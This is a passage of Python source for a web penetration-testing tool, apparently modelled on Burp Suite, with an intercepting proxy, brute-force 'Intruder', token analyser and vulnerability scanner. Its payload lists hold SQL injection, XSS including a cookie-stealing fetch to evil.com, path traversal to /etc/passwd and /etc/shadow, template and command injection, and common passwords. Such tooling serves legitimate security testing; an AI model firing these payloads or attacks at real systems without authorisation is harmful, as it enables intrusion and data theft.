        headers = self._read_headers(self.csock)
        # RFC 7231 §5.1.1 — respond 100 Continue so body bytes are released
        if headers.get('Expect', headers.get('expect', '')).lower() == '100-continue':
            try:
                self.csock.sendall(b"HTTP/1.1 100 Continue\r\n\r\n")
            except Exception:
                pass
        body = self._read_body(self.csock, headers)
        parsed = urlparse(url)
        host = parsed.hostname or headers.get('Host', '').split(':')[0]
        port = parsed.port or 80
        path = (parsed.path or '/') + (('?' + parsed.query) if parsed.query else '')
        self._forward(self.csock, method, path, url, headers, body, host, port, 'http')

    def _http_stream(self, sock, host: str, port: int, scheme: str):
        while True:
            try:
                first = self._readline(sock)
                if not first:
                    break
                parts = first.split()
                if len(parts) < 2:
                    break
                method = parts[0].upper()
                path = parts[1]
                headers = self._read_headers(sock)
                # RFC 7231 §5.1.1 — send 100 Continue so the browser releases the body
                if headers.get('Expect', headers.get('expect', '')).lower() == '100-continue':
                    try:
                        sock.sendall(b"HTTP/1.1 100 Continue\r\n\r\n")
                    except Exception:
                        pass
                body = self._read_body(sock, headers)
                url = f"{scheme}://{host}{path}"
                ok = self._forward(sock, method, path, url, headers, body, host, port, scheme)
                if not ok:
                    break
                conn_parts = [p.strip().lower() for p in
                             headers.get('Connection', headers.get('connection', '')).split(',')]
                if 'close' in conn_parts:
                    break
            except Exception:
                break

    def _forward(self, client_sock, method, path, url, headers, body, host, port, scheme) -> bool:
        mid = str(uuid.uuid4())
        start = time.time()
        proxy = self.proxy

        # Apply match/replace rules
        headers, body = proxy.apply_rules(url, headers, body, 'request')

        # ── Request intercept (with optional URL filter) ──────────────────
        if proxy.intercept.enabled:
            flt = getattr(proxy, '_intercept_url_filter', '')
            should_hold = True
            if flt:
                try:
                    should_hold = bool(re.search(flt, url, re.I))
                except re.error:
                    should_hold = flt in url
            if should_hold:
                pi = proxy.intercept.hold_request(mid, url, method, headers, body)
                if pi is None:
                    self._send_err(client_sock, 403, "Dropped by Kingception")
                    return False
                if pi.modified_headers is not None:
                    headers = pi.modified_headers
                if pi.forwarded:
                    body = pi.modified_body   # None = no body; bytes = modified body

        # ── Open connection to remote server ──────────────────────────────
        try:
            rsock = socket.create_connection((host, port), timeout=20)
            if scheme == 'https':
                # Force HTTP/1.1 on the remote side too so we can parse responses
                rctx = ssl.create_default_context()
                rctx.check_hostname = False
                rctx.verify_mode = ssl.CERT_NONE
                try:
                    rctx.set_alpn_protocols(['http/1.1'])
                except AttributeError:
                    pass
                rsock = rctx.wrap_socket(rsock, server_hostname=host)
        except Exception as e:
            self._send_err(client_sock, 502, f"Connect failed: {e}")
            return False

        # ── WebSocket upgrade: dedicated handshake + raw relay path ─────────
        # MUST be checked before the normal request-building code below,
        # which strips Upgrade/Connection and forces Connection: close —
        # exactly the two headers a WS handshake requires to succeed.
        conn_hdr = headers.get('Connection', headers.get('connection', '')).lower()
        upg_hdr  = headers.get('Upgrade', headers.get('upgrade', '')).lower()
        is_ws_upgrade = upg_hdr == 'websocket' and 'upgrade' in [
            p.strip() for p in conn_hdr.split(',')]
        if is_ws_upgrade:
            return self._handle_ws_upgrade(
                client_sock, rsock, mid, method, path, url, headers, body,
                host, port, scheme, start)

        try:
            # ── Build and send the request ────────────────────────────────
            # Always strip hop-by-hop / encoding headers; recalculate Content-Length
            skip_req = {'proxy-connection', 'proxy-authorization', 'proxy-authenticate',
                        'content-length', 'transfer-encoding', 'te', 'trailers',
                        'upgrade', 'connection', 'expect'}
            req_lines = [f"{method} {path} HTTP/1.1"]
            has_host = False
            for k, v in headers.items():
                if k.lower() in skip_req:
                    continue
                if k.lower() == 'host':
                    has_host = True
                req_lines.append(f"{k}: {v}")
            if not has_host:
                req_lines.append(f"Host: {host}")
            req_lines.append("Connection: close")   # force non-persistent — prevents keep-alive hangs
            if body:
                req_lines.append(f"Content-Length: {len(body)}")
            req_lines.append("")
            req_lines.append("")
            raw_req = "\r\n".join(req_lines).encode('utf-8', 'replace')
            rsock.sendall(raw_req)
            if body:
                rsock.sendall(body)

            # ── Read raw response from server ─────────────────────────────
            resp_raw = self._recv_all(rsock)
            if not resp_raw:
                self._send_err(client_sock, 502, "Empty response from server")
                return False

            # ── Parse response status line + headers ──────────────────────
            header_end = resp_raw.find(b'\r\n\r\n')
            if header_end == -1:
                header_end = resp_raw.find(b'\n\n')
                sep_len = 2
            else:
                sep_len = 4

            if header_end == -1:
                # No header/body separator — treat whole thing as body
                status, reason, resp_headers, resp_body = 200, "OK", {}, resp_raw
            else:
                header_section = resp_raw[:header_end].decode('utf-8', 'replace')
                resp_body_raw  = resp_raw[header_end + sep_len:]
                lines = header_section.split('\n')
                status_line = lines[0].strip()
                parts = status_line.split(' ', 2)
                try:
                    status = int(parts[1])
                except Exception:
                    status = 200
                reason = parts[2].strip() if len(parts) > 2 else ""

                resp_headers: dict = {}
                for l in lines[1:]:
                    l = l.strip()
                    if ':' in l:
                        k2, v2 = l.split(':', 1)
                        resp_headers[k2.strip()] = v2.strip()

                # Decode transfer-encoding / content-encoding
                te2 = resp_headers.get('Transfer-Encoding', resp_headers.get('transfer-encoding', '')).lower()
                ce  = resp_headers.get('Content-Encoding', resp_headers.get('content-encoding', ''))
                if 'chunked' in te2:
                    resp_body = self._decode_chunked(resp_body_raw)
                else:
                    resp_body = resp_body_raw
                resp_body = decompress(resp_body, ce)

            dur = time.time() - start

            # Apply match/replace on response
            _, resp_body = proxy.apply_rules(url, resp_headers, resp_body, 'response')

            # Store in DB
            msg = dict(
                id=mid, url=url, method=method, host=host, port=port,
                path=path, scheme=scheme, req_headers=headers, req_body=body,
                resp_headers=resp_headers, resp_body=resp_body, status=status,
                ts=start, dur=dur, resp_size=len(resp_body),
                content_type=resp_headers.get('Content-Type',
                             resp_headers.get('content-type', '')),
                source_ip=str(self.caddr[0]) if self.caddr else ''
            )
            proxy.process_message(msg)

            # ── Send response back to browser ─────────────────────────────
            skip_resp = {'transfer-encoding', 'content-encoding', 'content-length',
                         'connection', 'keep-alive'}
            out = [f"HTTP/1.1 {status} {reason}"]
            for k, v in resp_headers.items():
                if k.lower() not in skip_resp:
                    out.append(f"{k}: {v}")
            out.append(f"Content-Length: {len(resp_body)}")
            out.append("Connection: close")
            out.append("")
            out.append("")
            client_sock.sendall("\r\n".join(out).encode('utf-8', 'replace'))
            client_sock.sendall(resp_body)
            return True

        except Exception as e:
            try:
                self._send_err(client_sock, 502, str(e))
            except Exception:
                pass
            return False
        finally:
            try:
                rsock.close()
            except Exception:
                pass

    def _handle_ws_upgrade(self, client_sock, rsock, mid, method, path, url,
                           headers, body, host, port, scheme, start) -> bool:
        """Dedicated WebSocket handshake path. Sends the upgrade request to
        the origin WITHOUT stripping Upgrade/Connection and WITHOUT forcing
        Connection: close (both of which the normal _forward() path does,
        which is exactly why WS upgrades were silently failing). On a 101
        response, relays raw bytes bidirectionally for the life of the
        session — same pattern as _tunnel() — instead of trying to read a
        bounded HTTP response that will never arrive."""
        proxy = self.proxy
        try:
            # Preserve every header exactly as the client sent it — the
            # Sec-WebSocket-Key/Version/Protocol values must round-trip
            # untouched for the origin to compute a valid Sec-WebSocket-Accept.
            req_lines = [f"{method} {path} HTTP/1.1"]
            has_host = False
            for k, v in headers.items():
                if k.lower() in ('proxy-connection', 'proxy-authorization', 'proxy-authenticate'):
                    continue
                if k.lower() == 'host':
                    has_host = True
                req_lines.append(f"{k}: {v}")
            if not has_host:
                req_lines.append(f"Host: {host}")
            req_lines.append("")
            req_lines.append("")
            rsock.sendall("\r\n".join(req_lines).encode('utf-8', 'replace'))
            if body:
                rsock.sendall(body)

            # Read ONLY the status line + headers — a 101 response has no
            # body, and _recv_all() would block for its full timeout waiting
            # for a socket close that a live WS session will never produce.
            status_line = self._readline(rsock)
            parts = status_line.split(' ', 2)
            try:
                status = int(parts[1])
            except Exception:
                status = 0
            reason = parts[2].strip() if len(parts) > 2 else ""
            resp_headers = self._read_headers(rsock)

            if status != 101:
                # Origin declined the upgrade (auth required, wrong path,
                # etc). Read whatever normal body it sent and complete this
                # as an ordinary HTTP response — no relay needed.
                resp_body = self._read_body(rsock, resp_headers)
                dur = time.time() - start
                msg = dict(
                    id=mid, url=url, method=method, host=host, port=port,
                    path=path, scheme=scheme, req_headers=headers, req_body=body,
                    resp_headers=resp_headers, resp_body=resp_body, status=status,
                    ts=start, dur=dur, resp_size=len(resp_body),
                    content_type=resp_headers.get('Content-Type',
                                 resp_headers.get('content-type', '')),
                    source_ip=str(self.caddr[0]) if self.caddr else ''
                )
                proxy.process_message(msg)
                out = [f"HTTP/1.1 {status} {reason}"]
                for k, v in resp_headers.items():
                    if k.lower() not in ('transfer-encoding', 'content-length', 'connection'):
                        out.append(f"{k}: {v}")
                out.append(f"Content-Length: {len(resp_body)}")
                out.append("Connection: close")
                out.append(""); out.append("")
                client_sock.sendall("\r\n".join(out).encode('utf-8', 'replace'))
                client_sock.sendall(resp_body)
                return False

            # ── 101 Switching Protocols — relay the handshake to the client,
            # log it, then hand off to a raw bidirectional byte pump ────────
            dur = time.time() - start
            msg = dict(
                id=mid, url=url, method=method, host=host, port=port,
                path=path, scheme=scheme, req_headers=headers, req_body=body,
                resp_headers=resp_headers, resp_body=b'', status=101,
                ts=start, dur=dur, resp_size=0, content_type='websocket',
                source_ip=str(self.caddr[0]) if self.caddr else ''
            )
            proxy.process_message(msg)

            out = [f"HTTP/1.1 101 {reason or 'Switching Protocols'}"]
            for k, v in resp_headers.items():
                out.append(f"{k}: {v}")
            out.append(""); out.append("")
            client_sock.sendall("\r\n".join(out).encode('utf-8', 'replace'))

            def relay(src, dst):
                try:
                    while True:
                        d = src.recv(65536)
                        if not d:
                            break
                        dst.sendall(d)
                except Exception:
                    pass
                try:
                    dst.close()
                except Exception:
                    pass

            t = threading.Thread(target=relay, args=(rsock, client_sock), daemon=True)
            t.start()
            relay(client_sock, rsock)   # blocks until this side closes too
            return False

        except Exception as e:
            try:
                self._send_err(client_sock, 502, f"WS upgrade failed: {e}")
            except Exception:
                pass
            return False
        finally:
            try:
                rsock.close()
            except Exception:
                pass

    def _recv_all(self, sock) -> bytes:
        """Read entire server response with a generous timeout."""
        chunks = []
        sock.settimeout(20)
        try:
            while True:
                d = sock.recv(65536)
                if not d:
                    break
                chunks.append(d)
        except socket.timeout:
            pass
        except Exception:
            pass
        return b''.join(chunks)

    def _decode_chunked(self, data: bytes) -> bytes:
        """Decode chunked transfer-encoded body."""
        out = b''
        while data:
            nl = data.find(b'\r\n')
            if nl == -1:
                nl = data.find(b'\n')
            if nl == -1:
                break
            size_str = data[:nl].split(b';')[0].strip()
            try:
                size = int(size_str, 16)
            except Exception:
                break
            if size == 0:
                break
            start2 = nl + (2 if data[nl:nl+2] == b'\r\n' else 1)
            out += data[start2:start2 + size]
            data = data[start2 + size:]
            if data[:2] == b'\r\n':
                data = data[2:]
            elif data[:1] == b'\n':
                data = data[1:]
        return out

    def _send_err(self, s, code: int, msg: str):
        body = msg.encode('utf-8', 'replace')
        try:
            s.sendall(f"HTTP/1.1 {code} Error\r\nContent-Type: text/plain\r\n"
                      f"Content-Length: {len(body)}\r\n\r\n".encode() + body)
        except Exception:
            pass

# ========== PROXY SERVER ==========
class ProxyServer(QObject):
    msg_received = pyqtSignal(dict)
    started = pyqtSignal(int)
    stopped = pyqtSignal()
    err = pyqtSignal(str)

    def __init__(self):
        super().__init__()
        self.db = DB()
        self.certs = CertManager()
        self.intercept = InterceptMgr()
        self.rules = self.db.load_rules()
        self.responders = self.db.load_responders()
        self.scope = []
        self.is_running = False
        self._srv = None
        self.req_count = 0
        self.bytes_in = 0
        self.bytes_out = 0
        self._rate_hist = deque(maxlen=120)

    def rps(self) -> float:
        now = time.time()
        return sum(1 for t in self._rate_hist if now - t < 10) / 10.0

    def start(self, host='127.0.0.1', port=8080):
        if self.is_running:
            return
        try:
            self._srv = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self._srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            self._srv.bind((host, port))
            self._srv.listen(256)
            self._srv.settimeout(1.0)
            self.is_running = True
            threading.Thread(target=self._accept, daemon=True).start()
            self.started.emit(port)
        except Exception as e:
            self.err.emit(str(e))

    def stop(self):
        self.is_running = False
        if self._srv:
            try:
                self._srv.close()
            except Exception:
                pass
        self.intercept.toggle(False)
        self.stopped.emit()

    def _accept(self):
        while self.is_running:
            try:
                cs, ca = self._srv.accept()
                ProxyConn(cs, ca, self).start()
            except socket.timeout:
                continue
            except Exception:
                break

    def process_message(self, msg: dict):
        if not self._in_scope(msg['url']):
            return
        self.db.save_msg(msg)
        self.req_count += 1
        self.bytes_out += len(msg.get('req_body') or b'')
        self.bytes_in += msg.get('resp_size', 0)
        self._rate_hist.append(time.time())
        self.msg_received.emit(msg)

    def _in_scope(self, url: str) -> bool:
        if not self.scope:
            return True
        for r in self.scope:
            if not r.enabled:
                continue
            matched = r.pattern in url or bool(re.search(r.pattern, url, re.I))
            if r.rule_type == 'include' and matched:
                return True
            if r.rule_type == 'exclude' and matched:
                return False
        return any(r.rule_type == 'include' for r in self.scope if r.enabled)

    def apply_rules(self, url, headers, body, direction):
        for r in self.rules:
            if not r.enabled or r.apply_to not in (direction, 'both'):
                continue
            if r.scope in ('body', 'both') and body:
                try:
                    s = decode_body(body)
                    if r.is_regex:
                        s = re.sub(r.pattern, r.replace, s)
                    else:
                        s = s.replace(r.pattern, r.replace)
                    body = s.encode('utf-8', 'replace')
                except Exception:
                    pass
            if r.scope in ('headers', 'both') and headers:
                nh = {}
                for k, v in headers.items():
                    if r.is_regex:
                        v = re.sub(r.pattern, r.replace, v)
                    else:
                        v = v.replace(r.pattern, r.replace)
                    nh[k] = v
                headers = nh
        return headers, body

# ========== PAYLOADS ==========
class Payloads:
    SQLI = ["'", "' OR '1'='1", "' OR '1'='1'--", "1; DROP TABLE users--",
            "' AND SLEEP(3)--", "' UNION SELECT NULL,username,password FROM users--",
            "1' AND 1=1--", "1' AND 1=2--", "admin'--", "' OR 1=1--",
            "\" OR 1=1--", "' OR 'x'='x", "' AND '1'='2", "1 OR 1=1",
            "') OR ('1'='1", "1;SELECT SLEEP(5)#", "1 AND SLEEP(5)",
            "1' AND SLEEP(3)-- -", "'; WAITFOR DELAY '0:0:3'--"]
    XSS = ["<script>alert(1)</script>", "<img src=x onerror=alert(1)>",
           "<svg onload=alert(1)>", "javascript:alert(1)",
           "'\"><script>alert(1)</script>", "<iframe src=javascript:alert(1)>",
           "'-alert(1)-'", "<body onload=alert(1)>",
           "<input autofocus onfocus=alert(1)>", "<details open ontoggle=alert(1)>",
           "<script>fetch('//evil.com?c='+document.cookie)</script>"]
    LFI = ["../etc/passwd", "../../etc/passwd", "../../../etc/passwd",
           "....//....//etc/passwd", "%2e%2e%2fetc%2fpasswd",
           "..%252f..%252fetc%252fpasswd",
           "php://filter/read=convert.base64-encode/resource=index.php",
           "/proc/self/environ", "C:\\windows\\win.ini", "..\\..\\windows\\win.ini",
           "file:///etc/passwd", "../../../../etc/shadow"]
    SSTI = ["{{7*7}}", "${7*7}", "<%= 7*7 %>", "#{7*7}", "*{7*7}",
            "{{config}}", "{{self.__class__.__mro__[1].__subclasses__()}}",
            "{{''.__class__.mro()[2].__subclasses__()}}", "${T(java.lang.Runtime).getRuntime().exec('id')}"]
    CMDI = ["; ls", "& whoami", "| id", "|| id", "&& id", "; cat /etc/passwd",
            "`whoami`", "$(whoami)", "; sleep 5", "| sleep 5", "& ping -c 3 127.0.0.1 &"]
    FUZZ = ["", " ", "null", "undefined", "NaN", "Infinity", "-1", "0", "99999999",
            "true", "false", "[]", "{}", "A"*100, "A"*1000, "\x00", "%00",
            "<", ">", "\"", "'", "\\", "/", ".", "\n", "\r\n", "../", "..%2f"]
    NOSQL = ['{"$gt":""}', '{"$ne":null}', '{"$regex":".*"}', '{"$where":"this.password.length>0"}']
    REDIR = ["//evil.com", "https://evil.com", "\\\\evil.com", "/\\evil.com", "///evil.com", "https://evil.com%40trusted.com"]
    XXEFUZZ = ['<?xml version="1.0"?><!DOCTYPE x[<!ENTITY y SYSTEM "file:///etc/passwd">]><x>&y;</x>']
    COMMON_PASSWORDS = ["123456", "password", "admin", "letmein", "qwerty", "abc123", "monkey", "1234567890",
                        "password1", "iloveyou", "admin123", "test", "pass", "root", "toor", "secret",
                        "P@ssw0rd", "P@$$w0rd", "Welcome1", "Summer2024!", "Winter2024!", "Spring2024!",
                        "Passw0rd!", "changeme", "qwerty123", "111111", "dragon", "master", "sunshine"]
    COMMON_USERS = ["admin", "administrator", "root", "user", "test", "guest", "operator",
                    "manager", "support", "info", "webmaster", "dev", "api"]

    @classmethod
    def categories(cls) -> Dict[str, List[str]]:
        return {
            "SQL Injection": cls.SQLI, "XSS": cls.XSS,
            "LFI / Path Traversal": cls.LFI, "SSTI": cls.SSTI,
            "Command Injection": cls.CMDI, "Fuzzing": cls.FUZZ,
            "NoSQL Injection": cls.NOSQL, "Open Redirect": cls.REDIR,
            "XXE": cls.XXEFUZZ,
            "Common Passwords": cls.COMMON_PASSWORDS,
            "Common Usernames": cls.COMMON_USERS,
        }

# ========== SCOPE MANAGER ==========
class ScopeManager:
    """Track in-scope / out-of-scope targets."""
    def __init__(self):
        self._rules: List[dict] = []   # {pattern, include, regex}

    def add(self, pattern: str, include: bool = True, is_regex: bool = False):
        self._rules.append({"pattern": pattern, "include": include, "regex": is_regex})

    def remove(self, idx: int):
        if 0 <= idx < len(self._rules):
            self._rules.pop(idx)

    def in_scope(self, url: str) -> bool:
        if not self._rules:
            return True
        result = False
        for r in self._rules:
            try:
                matched = bool(re.search(r['pattern'], url, re.I)) if r['regex'] \
                          else r['pattern'].lower() in url.lower()
            except Exception:
                matched = False
            if matched:
                result = r['include']
        return result

    def all_rules(self) -> List[dict]:
        return list(self._rules)


# ========== SESSION MANAGER ==========
class SessionManager:
    """Store named sessions (cookies + headers) for replay."""
    def __init__(self):
        self._sessions: Dict[str, dict] = {}
        self._active: Optional[str] = None

    def save(self, name: str, cookies: str, headers: str):
        self._sessions[name] = {"cookies": cookies, "headers": headers}

    def load(self, name: str) -> Optional[dict]:
        return self._sessions.get(name)

    def delete(self, name: str):
        self._sessions.pop(name, None)
        if self._active == name:
            self._active = None

    def set_active(self, name: Optional[str]):
        self._active = name

    def active(self) -> Optional[dict]:
        if self._active:
            return self._sessions.get(self._active)
        return None

    def names(self) -> List[str]:
        return list(self._sessions.keys())


# ========== SEQUENCER (Token Analysis) ==========
class Sequencer(QThread):
    """Statistical randomness analysis for session tokens / CSRF tokens."""
    sample_ready = pyqtSignal(int, str)   # (count, token)
    analysis_done = pyqtSignal(dict)
    error = pyqtSignal(str)

    def __init__(self, url: str, param: str, method: str, count: int,
                 extra_headers: dict, post_body: str):
        super().__init__()
        self.url = url
        self.param = param
        self.method = method.upper()
        self.count = count
        self.extra_headers = extra_headers
        self.post_body = post_body
        self._running = True

    def stop(self):
        self._running = False

    def run(self):
        if not HAS_REQUESTS:
            self.error.emit("pip install requests")
            return
        tokens = []
        for i in range(self.count):
            if not self._running:
                break
            try:
                h = {'User-Agent': 'Kingception/1.0'}
                h.update(self.extra_headers)
                r = requests.request(
                    self.method, self.url, headers=h,
                    data=self.post_body or None,
                    verify=False, timeout=10, allow_redirects=False)
                # Try to extract param from response body, headers, or cookies
                tok = None
                if self.param:
                    m = re.search(rf'{re.escape(self.param)}[=:\"\']?\s*([A-Za-z0-9+/=_\-\.%]{8,})',
                                  r.text + str(dict(r.headers)) + str(dict(r.cookies)))
                    if m:
                        tok = m.group(1)
                if not tok:
                    # Try cookies
                    for k, v in r.cookies.items():
                        if 'session' in k.lower() or 'token' in k.lower() or 'csrf' in k.lower():
                            tok = v
                            break
                if not tok:
                    tok = r.headers.get('Set-Cookie', '')[:80]
                if tok:
                    tokens.append(tok)
                    self.sample_ready.emit(i + 1, tok)
            except Exception as e:
                self.error.emit(str(e))
                break

        if len(tokens) < 2:
            self.error.emit(f"Only {len(tokens)} token(s) collected — need at least 2")
            return

        result = self._analyse(tokens)
        self.analysis_done.emit(result)

    def _analyse(self, tokens: List[str]) -> dict:
        """FIPS 140-2 / NIST SP800-22 inspired bit-level analysis."""
        # Convert tokens to bit strings
        bits = []
        for t in tokens:
            try:
                raw = __import__('base64').b64decode(t + '==')
            except Exception:
                raw = t.encode('utf-8', 'replace')
            for byte in raw:
                for bit_pos in range(7, -1, -1):
                    bits.append((byte >> bit_pos) & 1)

        n = len(bits)
        if n < 8:
            return {"error": "Not enough bits"}

        # Monobit test (FIPS 140-2 Test 1)
        ones = sum(bits)
        zeros = n - ones
        monobit_pass = 9654 < ones < 10346 if n == 20000 else abs(ones - zeros) < n * 0.1

        # Entropy estimate (Shannon)
        try:
            from math import log2
            p1 = ones / n; p0 = zeros / n
            entropy = -(p1 * log2(p1) if p1 > 0 else 0) - (p0 * log2(p0) if p0 > 0 else 0)
        except Exception:
            entropy = 0

        # Runs test
        runs = 1
        for i in range(1, len(bits)):
            if bits[i] != bits[i-1]:
                runs += 1
        exp_runs = (2 * ones * zeros) / n + 1 if n > 0 else 0
        runs_pass = abs(runs - exp_runs) < 3 * (n ** 0.5)

        # Token length variance
        lengths = [len(t) for t in tokens]
        avg_len = sum(lengths) / len(lengths)
        unique_pct = len(set(tokens)) / len(tokens) * 100

        # Char frequency analysis
        all_chars = ''.join(tokens)
        from collections import Counter
        freq = Counter(all_chars)
        char_entropy = 0
        for c, cnt in freq.items():
            p = cnt / len(all_chars)
            char_entropy -= p * __import__('math').log2(p)

        # Similarity — how many tokens share a common prefix
        prefix_len = 0
        if len(tokens) >= 2:
            while prefix_len < min(len(tokens[0]), len(tokens[1])) and \
                  all(t[:prefix_len+1] == tokens[0][:prefix_len+1] for t in tokens[:20]):
                prefix_len += 1

        # Overall grade
        score = 0
        if monobit_pass: score += 25
        if runs_pass: score += 25
        if entropy > 0.95: score += 25
        if unique_pct >= 100: score += 25
        grade = ("A — Excellent" if score == 100 else
                 "B — Good" if score >= 75 else
                 "C — Fair" if score >= 50 else
                 "D — Poor" if score >= 25 else "F — Very Weak")

        return {
            "count": len(tokens), "bits": n,
            "monobit_pass": monobit_pass, "ones": ones, "zeros": zeros,
            "entropy_bits": round(entropy, 4),
            "char_entropy": round(char_entropy, 4),
            "runs": runs, "expected_runs": round(exp_runs, 1), "runs_pass": runs_pass,
            "avg_length": round(avg_len, 1), "unique_pct": round(unique_pct, 2),
            "common_prefix_len": prefix_len,
            "score": score, "grade": grade,
            "sample_tokens": tokens[:5],
        }


# ========== INTRUDER ==========
class IntruderAttack(QThread):
    result = pyqtSignal(dict)
    progress = pyqtSignal(int, int)
    finished = pyqtSignal(str)

    SNIPER = "Sniper"
    BATTERING = "Battering Ram"
    PITCHFORK = "Pitchfork"
    CLUSTER_BOMB = "Cluster Bomb"

    def __init__(self, mode, url, method, headers_text, template,
                 payload_lists, concurrency=10, delay_ms=0):
        super().__init__()
        self.mode = mode
        self.url = url
        self.method = method
        self.headers_text = headers_text
        self.template = template
        self.payload_lists = payload_lists
        self.concurrency = concurrency
        self.delay_ms = delay_ms
        self.running = False

    def _build_jobs(self) -> List[List[str]]:
        lists = self.payload_lists
        if not lists:
            return []
        if self.mode == self.SNIPER:
            return [[p] for p in lists[0]]
        if self.mode == self.BATTERING:
            return [[p] * self.template.count('§PAYLOAD§') for p in lists[0]]
        if self.mode == self.PITCHFORK:
            return list(map(list, zip(*lists)))
        if self.mode == self.CLUSTER_BOMB:
            return [list(combo) for combo in iterproduct(*lists)]
        return [[p] for p in lists[0]]

    def _build_body(self, payloads: List[str]) -> str:
        result = self.template
        for p in payloads:
            result = result.replace('§PAYLOAD§', p, 1)
        return result

    def run(self):
        self.running = True
        jobs = self._build_jobs()
        headers = {}
        for line in self.headers_text.strip().split('\n'):
            if ':' in line:
                k, v = line.split(':', 1)
                headers[k.strip()] = v.strip()
        done = 0
        with concurrent.futures.ThreadPoolExecutor(max_workers=self.concurrency) as ex:
            futs = [ex.submit(self._send, i, payloads, headers) for i, payloads in enumerate(jobs)]
            for f in concurrent.futures.as_completed(futs):
                if not self.running:
                    break
                done += 1
                self.progress.emit(done, len(jobs))
                r = f.result()
                if r:
                    self.result.emit(r)
        self.finished.emit(f"Attack complete — {done}/{len(jobs)} requests")

    def _send(self, idx: int, payloads: List[str], headers: dict) -> Optional[dict]:
        if not HAS_REQUESTS:
            return None
        if self.delay_ms:
            time.sleep(self.delay_ms / 1000)
        body_str = self._build_body(payloads)
        pl_display = ', '.join(p[:40] for p in payloads)
        try:
            start = time.time()
            r = requests.request(self.method, self.url, headers=headers,
                                 data=body_str.encode('utf-8', 'replace') if body_str.strip() else None,
                                 verify=False, timeout=20, allow_redirects=False)
            return dict(idx=idx, payload=pl_display, status=r.status_code,
                        length=len(r.content), dur=round(time.time() - start, 3),
                        response=r.text[:5000], headers=dict(r.headers))
        except Exception as e:
            return dict(idx=idx, payload=pl_display, status=0, length=0, dur=0, response=str(e), headers={})

    def stop(self):
        self.running = False

# ========== SCANNER ==========
class Scanner(QThread):
    finding = pyqtSignal(dict)
    progress = pyqtSignal(int, str)
    log = pyqtSignal(str)
    done = pyqtSignal(int)

    def __init__(self, target: str, db: DB):
        super().__init__()
        self.target = target.rstrip('/')
        self.db = db
        self.running = False

    def run(self):
        self.running = True
        checks = [
            ("Security Headers", self._headers, "medium"),
            ("SQL Injection", self._sqli, "high"),
            ("Reflected XSS", self._xss, "high"),
            ("Path Traversal", self._lfi, "high"),
            ("CORS Misconfiguration", self._cors, "medium"),
            ("Open Redirect", self._redirect, "medium"),
            ("SSTI", self._ssti, "critical"),
            ("Command Injection", self._cmdi, "critical"),
            ("SSL/TLS Config", self._tls, "medium"),
            ("XXE", self._xxe, "high"),
            ("Clickjacking", self._clickjack, "medium"),
        ]
        found = 0
        for i, (name, fn, sev) in enumerate(checks):
            if not self.running:
                break
            self.progress.emit(int((i + 1) / len(checks) * 100), f"Checking: {name}…")
            self.log.emit(f"[→] {name}")
            try:
                for r in fn():
                    found += 1
                    self.finding.emit(r)
                    self.db.save_scan(r)
            except Exception as e:
                self.log.emit(f"[!] {name}: {e}")
        self.done.emit(found)

    def stop(self):
        self.running = False

    def _req(self, url, method='GET', data=None, headers=None, timeout=8):
        if not HAS_REQUESTS:
            return 0, "", {}
        try:
            h = {'User-Agent': 'Kingception/1.0-Scanner'}
            if headers:
                h.update(headers)
            r = requests.request(method, url, headers=h, data=data,
                                 timeout=timeout, verify=False, allow_redirects=False)
            return r.status_code, r.text, dict(r.headers)
        except Exception:
            return 0, "", {}

    def _mk(self, vtype, sev, desc, req_ev, resp_ev, fix, cwe, cvss=5.0, conf="medium"):
        return dict(id=str(uuid.uuid4()), url=self.target, vuln_type=vtype, severity=sev,
                    desc=desc, req_ev=req_ev, resp_ev=resp_ev[:500], fix=fix,
                    cwe=cwe, cvss=cvss, ts=time.time(), confidence=conf)

    def _headers(self):
        st, _, h = self._req(self.target)
        if st == 0:
            return []
        hl = {k.lower(): v for k, v in h.items()}
        res = []
        for hdr, name, sev, cwe in [
            ('strict-transport-security', 'Missing HSTS', 'medium', 'CWE-311'),
            ('content-security-policy', 'Missing CSP', 'medium', 'CWE-693'),
            ('x-frame-options', 'Missing X-Frame-Options', 'medium', 'CWE-1021'),
            ('x-content-type-options', 'Missing X-Content-Type-Options', 'low', 'CWE-16'),
            ('permissions-policy', 'Missing Permissions-Policy', 'info', 'CWE-16'),
        ]:
            if hdr not in hl:
                res.append(self._mk(name, sev, f"Header '{hdr}' absent",
                                    f"GET {self.target}", str(list(hl.keys())[:8]),
                                    f"Add {hdr} response header", cwe, 4.0))
        srv = hl.get('server', '')
        if re.search(r'\d+\.\d+', srv):
            res.append(self._mk("Server Version Disclosure", "low",
                                f"Server header: {srv}", f"GET {self.target}", f"Server: {srv}",
                                "Suppress version in server config", "CWE-200", 3.5))
        return res

    def _sqli(self):
        for p in ["'", "' OR '1'='1'--", "' AND SLEEP(3)--"]:
            if not self.running:
                break
            url = f"{self.target}?id={url_quote(p)}"
            t0 = time.time()
            st, body, _ = self._req(url)
            dur = time.time() - t0
            errs = ['sql syntax', 'mysql_fetch', 'ora-', 'pg_query', 'sqlite', 'jdbc']
            if any(e in body.lower() for e in errs):
                return [self._mk("SQL Injection", "high", f"Error-based SQLi: {p}",
                                 f"GET {url}", body[:300], "Use parameterized queries", "CWE-89", 9.8, "high")]
            if 'SLEEP' in p and dur > 2.5:
                return [self._mk("Blind Time-Based SQLi", "high",
                                 f"Delay {dur:.1f}s", f"GET {url}", f"Time: {dur:.2f}s",
                                 "Use parameterized queries", "CWE-89", 9.1)]
        return []

    def _xss(self):
        for p in ["<script>alert(1)</script>", "<img src=x onerror=alert(1)>"]:
            if not self.running:
                break
            url = f"{self.target}?q={url_quote(p)}"
            st, body, h = self._req(url)
            if p in body:
                csp = h.get('Content-Security-Policy', '')
                return [self._mk("Reflected XSS", "high" if not csp else "medium",
                                 f"Payload reflected: {p}", f"GET {url}", body[:300],
                                 "Encode output; add strict CSP", "CWE-79", 8.2)]
        return []

    def _lfi(self):
        for p in ["../etc/passwd", "....//....//etc/passwd", "%2e%2e%2fetc%2fpasswd"]:
            if not self.running:
                break
            url = f"{self.target}?file={p}&path={p}"
            _, body, _ = self._req(url)
            if 'root:x:' in body or 'bin/bash' in body:
                return [self._mk("Path Traversal", "high", f"File read via: {p}",
                                 f"GET {url}", body[:300], "Validate & sanitize file paths", "CWE-22", 9.1)]
        return []

    def _cors(self):
        _, _, h = self._req(self.target, headers={'Origin': 'https://evil.example.com'})
        acao = h.get('Access-Control-Allow-Origin', '')
        if 'evil' in acao or acao == '*':
            return [self._mk("CORS Misconfiguration", "high",
                             f"ACAO: {acao}", "Origin: evil.example.com", "",
